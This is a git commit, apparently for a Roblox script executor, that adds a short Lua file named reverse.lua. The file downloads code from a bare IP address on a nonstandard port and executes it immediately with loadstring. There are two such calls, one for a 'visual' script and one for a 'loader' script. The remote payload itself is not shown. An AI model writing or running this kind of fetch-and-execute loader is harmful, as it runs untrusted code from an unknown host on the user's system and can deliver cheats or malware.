726f6e67e5746b1b5d653cd692a7e6dae540b8d7
outhackernuls090-hash <outhacker.nuls090@gmail.com>
2025-11-02 14:09:22 +0100

    Add reverse.lua to load external scripts

---
+++ reverse.lua
@@ -0,0 +1,4 @@
+ID="038451e3-620c-45a4-930a-ecf05798dea3";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
